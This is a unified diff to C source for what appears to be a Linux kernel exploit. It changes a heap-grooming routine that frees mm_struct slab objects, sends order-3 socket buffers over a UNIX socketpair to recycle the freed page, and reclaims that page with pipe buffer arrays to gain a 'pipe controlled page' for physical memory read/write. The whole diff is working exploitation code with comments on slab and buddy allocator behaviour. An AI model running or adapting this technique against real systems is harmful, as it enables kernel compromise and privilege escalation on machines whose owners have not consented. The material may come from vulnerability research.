@@ -13,6 +13,10 @@
 _Static_assert(sizeof(PHYS_READ_TAG) == sizeof(PHYS_WRITE_TAG),
                "phys proof tag sizes");
 
+#if !defined(SLIDE_SKB_SEND_SIZE)
+#define SLIDE_SKB_SEND_SIZE SKB_SEND_SIZE
+#endif
+
 static int pipe_objects_ready;
 static int pipe_fds_drain[PIPE_DRAIN][2];
 static int pipe_fds_reclaim[PIPE_RECLAIM][2];
@@ -362,12 +366,38 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
   pr_info("pipe controlled page base=%016zx\n", base);
 
+  /* Intermediate grab, mirroring the device-proven util.c order: the 32 owned
+   * mm slots are freed, then 16 order-3 skb sends take the emptied slab's page
+   * and the skb close hands it straight back to the buddy (CPU pcp LIFO) so
+   * the ring pipe arrays get it as a fresh kmalloc-cgroup-2k slab. The emptied
+   * slab alone stays frozen+full in mm_cachep; it is never discarded. */
+  int skb_sv[2] = {-1, -1};
+  if (socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv) != 0) {
+    skb_sv[0] = -1;
+    skb_sv[1] = -1;
+  }
+  unsigned char *skb_page_buf = NULL;
+  struct iovec skb_iov;
+  struct msghdr skb_msg;
+  if (skb_sv[0] >= 0) {
+    int sndbuf = 1 << 20;
+    setsockopt(skb_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+    skb_page_buf = malloc(SLIDE_SKB_SEND_SIZE);
+    if (skb_page_buf) {
+      memset(skb_page_buf, 0, SLIDE_SKB_SEND_SIZE);
+      memset(&skb_iov, 0, sizeof(skb_iov));
+      skb_iov.iov_base = skb_page_buf;
+      skb_iov.iov_len = SLIDE_SKB_SEND_SIZE;
+      memset(&skb_msg, 0, sizeof(skb_msg));
+      skb_msg.msg_iov = &skb_iov;
+      skb_msg.msg_iovlen = 1;
+    }
+  }
+
   for (size_t i = 0; i + 1 < ORDER3_SIZE / MM_STRUCT_SZ; ++i) {
     SYSCHK(close(group_fds[i]));
     group_fds[i] = -1;
   }
-  SYSCHK(close(group_fds[ORDER3_SIZE / MM_STRUCT_SZ - 1]));
-
   for (size_t i = 0; i < prep.mm_cnt; i += objs_per_slab) {
     if (prep.memfds[i] > 0) {
       SYSCHK(close(prep.memfds[i]));
@@ -378,6 +408,32 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   sched_yield();
   sched_yield();
   sched_yield();
+  SYSCHK(close(group_fds[ORDER3_SIZE / MM_STRUCT_SZ - 1]));
+  group_fds[ORDER3_SIZE / MM_STRUCT_SZ - 1] = -1;
+
+  int reclaim_sent = 0;
+  if (skb_page_buf) {
+    for (int i = 0; i < SKB_RECLAIM_SENDS; ++i) {
+      if (sendmsg(skb_sv[0], &skb_msg, MSG_DONTWAIT) <= 0) {
+        break;
+      }
+      reclaim_sent++;
+    }
+    SYSCHK(close(skb_sv[0]));
+    skb_sv[0] = -1;
+    SYSCHK(close(skb_sv[1]));
+    skb_sv[1] = -1;
+  }
+
+  pin_to_core(CORE);
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    if (alloc_pipe_object(pipe_fds_reclaim[i]) != 0) {
+      pr_warning("p0 pipe ring alloc failed reclaim=%zu\n", i);
+      free(skb_page_buf);
+      pipe_child_release_ctx(&prep, NULL);
+      return 0;
+    }
+  }
 
   /* [pipefix] budget plan (campaign 13/15/16 arithmetic): F_SETPIPE_SZ
    * growth is charged per-real-uid against fs.pipe-user-pages-soft, and
@@ -407,15 +463,9 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
                 (size_t)PIPE_RECLAIM * P0_PIPE_RING_MIN_SLOTS);
   }
 
-  pin_to_core(CORE);
-  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-    if (alloc_pipe_object(pipe_fds_reclaim[i]) != 0) {
-      pr_warning("p0 pipe ring alloc failed reclaim=%zu\n", i);
-      pipe_child_release_ctx(&prep, NULL);
-      return 0;
-    }
-  }
-
+  pr_info("pipe controlled page base=%016zx freed=%d sends=%d\n", base,
+          (int)(ORDER3_SIZE / MM_STRUCT_SZ), reclaim_sent);
+  free(skb_page_buf);
   pipe_child_release_ctx(&prep, NULL);
   return base;
 }
